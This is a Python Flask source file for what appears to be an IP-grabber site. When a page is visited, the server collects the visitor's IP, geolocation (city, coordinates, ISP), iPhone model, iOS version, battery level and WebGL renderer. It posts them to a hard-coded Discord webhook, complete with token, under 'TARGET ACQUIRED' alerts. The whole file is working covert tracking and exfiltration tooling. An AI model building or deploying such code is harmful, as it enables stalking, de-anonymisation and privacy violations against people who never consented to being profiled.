from flask import Flask, render_template, request, jsonify
import requests
import json
import re
import os
import sys

app = Flask(__name__, template_folder='hehe')

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1527353925114794105/RoEyXsuW46terakrxr7dZzy-axy0f3fg-coZioe-ELUhQ6KTMPJFfoGaBC_E-fWakFH8"

def get_ip_info(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,proxy,hosting", timeout=5)
        data = r.json()
        if data.get('status') == 'success':
            return {
                "country": data.get("country", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "city": data.get("city", "Unknown"),
                "zip": data.get("zip", "Unknown"),
                "lat": data.get("lat", 0),
                "lon": data.get("lon", 0),
                "isp": data.get("isp", "Unknown"),
                "org": data.get("org", "Unknown"),
                "as": data.get("as", "Unknown"),
                "proxy": data.get("proxy", False),
                "hosting": data.get("hosting", False)
            }
        else:
            return {"country": "Unknown", "region": "Unknown", "city": "Unknown", "zip": "Unknown", "lat": 0, "lon": 0, "isp": "Unknown", "org": "Unknown", "as": "Unknown", "proxy": False, "hosting": False}
    except Exception as e:
        print(f"IP API Error: {e}", file=sys.stderr)
        return {"country": "Unknown", "region": "Unknown", "city": "Unknown", "zip": "Unknown", "lat": 0, "lon": 0, "isp": "Unknown", "org": "Unknown", "as": "Unknown", "proxy": False, "hosting": False}

def send_to_discord(payload):
    try:
        headers = {'Content-Type': 'application/json'}
        response = requests.post(DISCORD_WEBHOOK, data=json.dumps(payload), headers=headers, timeout=10)
        print(f"Discord webhook status: {response.status_code}", file=sys.stderr)
        if response.status_code not in [200, 204]:
            print(f"Discord webhook response: {response.text}", file=sys.stderr)
        return response.status_code in [200, 204]
    except Exception as e:
        print(f"Discord webhook error: {e}", file=sys.stderr)
        return False

@app.route('/')
def index():
    return render_template('site.html')

@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.get_json() or {}
    
    # Get real IP even behind proxies
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    
    if not ip or ip == '127.0.0.1':
        ip = request.headers.get('X-Real-Ip', request.remote_addr)
    
    ip_info = get_ip_info(ip)
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Client-side detected iPhone model (more accurate)
    client_iphone_model = data.get('clientIphoneModel', 'Unknown')
    client_ios_version = data.get('clientIosVersion', 'Unknown')
    
    # Server-side fallback parsing from User-Agent
    server_iphone_model = "Unknown"
    server_ios_version = "Unknown"
    
    if 'iPhone' in user_agent or 'iPad' in user_agent or 'Macintosh' in user_agent:
        # Try to extract model from User-Agent (legacy)
        model_match = re.search(r'iPhone(\d+,\d+)', user_agent)
        if model_match:
            model_code = f"iPhone{model_match.group(1)}"
            server_iphone_model = map_iphone_model(model_code)
        else:
            # Try iPad
            ipad_match = re.search(r'iPad(\d+,\d+)', user_agent)
            if ipad_match:
                server_iphone_model = f"iPad (Model Unknown)"
        
        # Extract iOS version from User-Agent
        os_match = re.search(r'OS (\d+[_\d]+)', user_agent)
        if os_match:
            server_ios_version = os_match.group(1).replace('_', '.')
        else:
            # Try modern Safari format
            modern_os = re.search(r'Version/[\d.]+.*Mobile.*Safari', user_agent)
            if modern_os:
                version_match = re.search(r'Version/([\d.]+)', user_agent)
                if version_match:
                    server_ios_version = f"~{version_match.group(1)} (Safari Version)"
    
    # Prefer client-side detection if available (more accurate)
    iphone_model = client_iphone_model if client_iphone_model != 'Unknown' else server_iphone_model
    ios_version = client_ios_version if client_ios_version != 'Unknown' else server_ios_version
    
    connection_type = data.get('connectionType', 'Unknown')
    battery_level = data.get('batteryLevel', 'Unknown')
    webgl_renderer = data.get('webglRenderer', 'Unknown')
    
    # Build Discord embed - MUST be proper JSON structure
    embed = {
        "title": "🎯 New Target Captured",
        "description": f"**IP:** `{ip}`\n**Time:** <t:{int(__import__('time').time())}:F>",
        "color": 16711680,
        "fields": [
            {"name": "📱 iPhone Model", "value": f"`{iphone_model}`", "inline": True},
            {"name": "⚙️ iOS Version", "value": f"`{ios_version}`", "inline": True},
            {"name": "🔋 Battery Level", "value": f"`{battery_level}%`", "inline": True},
            {"name": "🌐 Connection", "value": f"`{connection_type}`", "inline": True},
            {"name": "🎨 WebGL Renderer", "value": f"`{webgl_renderer}`", "inline": True},
            {"name": "🌍 Country", "value": f"`{ip_info['country']}`", "inline": True},
            {"name": "🏙️ City", "value": f"`{ip_info['city']}`", "inline": True},
            {"name": "📍 Region", "value": f"`{ip_info['region']}`", "inline": True},
            {"name": "🌐 ISP", "value": f"`{ip_info['isp']}`", "inline": True},
            {"name": "📌 Latitude", "value": f"`{ip_info['lat']}`", "inline": True},
            {"name": "📌 Longitude", "value": f"`{ip_info['lon']}`", "inline": True},
            {"name": "🕵️ Proxy/VPN", "value": f"`Proxy: {ip_info['proxy']} | Hosting: {ip_info['hosting']}`", "inline": True},
            {"name": "📝 User Agent", "value": f"```{user_agent[:1000]}```", "inline": False}
        ],
        "footer": {"text": "Ghaithollah Intel • Each visitor is isolated and logged individually"},
        "timestamp": __import__('datetime').datetime.utcnow().isoformat() + "Z"
    }
    
    payload = {
        "content": "@everyone 🚨 **TARGET ACQUIRED** 🚨",
        "embeds": [embed]
    }
    
    success = send_to_discord(payload)
    
    return jsonify({
        "success": success,
        "ip": ip,
        "iphoneModel": iphone_model,
        "iosVersion": ios_version,
        "batteryLevel": battery_level,
        "connectionType": connection_type,
        "location": f"{ip_info['city']}, {ip_info['region']}, {ip_info['country']}"
    })

def map_iphone_model(code):
    models = {
        "iPhone1,1": "iPhone 2G", "iPhone1,2": "iPhone 3G", "iPhone2,1": "iPhone 3GS",
        "iPhone3,1": "iPhone 4", "iPhone3,2": "iPhone 4", "iPhone3,3": "iPhone 4",
        "iPhone4,1": "iPhone 4S", "iPhone5,1": "iPhone 5", "iPhone5,2": "iPhone 5",
        "iPhone5,3": "iPhone 5c", "iPhone5,4": "iPhone 5c", "iPhone6,1": "iPhone 5s",
        "iPhone6,2": "iPhone 5s", "iPhone7,1": "iPhone 6 Plus", "iPhone7,2": "iPhone 6",
        "iPhone8,1": "iPhone 6s", "iPhone8,2": "iPhone 6s Plus", "iPhone8,4": "iPhone SE (1st gen)",
        "iPhone9,1": "iPhone 7", "iPhone9,2": "iPhone 7 Plus", "iPhone9,3": "iPhone 7",
        "iPhone9,4": "iPhone 7 Plus", "iPhone10,1": "iPhone 8", "iPhone10,2": "iPhone 8 Plus",
        "iPhone10,3": "iPhone X", "iPhone10,4": "iPhone 8", "iPhone10,5": "iPhone 8 Plus",
        "iPhone10,6": "iPhone X", "iPhone11,2": "iPhone XS", "iPhone11,4": "iPhone XS Max",
        "iPhone11,6": "iPhone XS Max", "iPhone11,8": "iPhone XR", "iPhone12,1": "iPhone 11",
        "iPhone12,3": "iPhone 11 Pro", "iPhone12,5": "iPhone 11 Pro Max", "iPhone12,8": "iPhone SE (2nd gen)",
        "iPhone13,1": "iPhone 12 mini", "iPhone13,2": "iPhone 12", "iPhone13,3": "iPhone 12 Pro",
        "iPhone13,4": "iPhone 12 Pro Max", "iPhone14,2": "iPhone 13 Pro", "iPhone14,3": "iPhone 13 Pro Max",
        "iPhone14,4": "iPhone 13 mini", "iPhone14,5": "iPhone 13", "iPhone14,6": "iPhone SE (3rd gen)",
        "iPhone14,7": "iPhone 14", "iPhone14,8": "iPhone 14 Plus", "iPhone15,2": "iPhone 14 Pro",
        "iPhone15,3": "iPhone 14 Pro Max", "iPhone15,4": "iPhone 15", "iPhone15,5": "iPhone 15 Plus",
        "iPhone16,1": "iPhone 15 Pro", "iPhone16,2": "iPhone 15 Pro Max", "iPhone17,1": "iPhone 16 Pro",
        "iPhone17,2": "iPhone 16 Pro Max", "iPhone17,3": "iPhone 16", "iPhone17,4": "iPhone 16 Plus"
    }
    return models.get(code, code)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
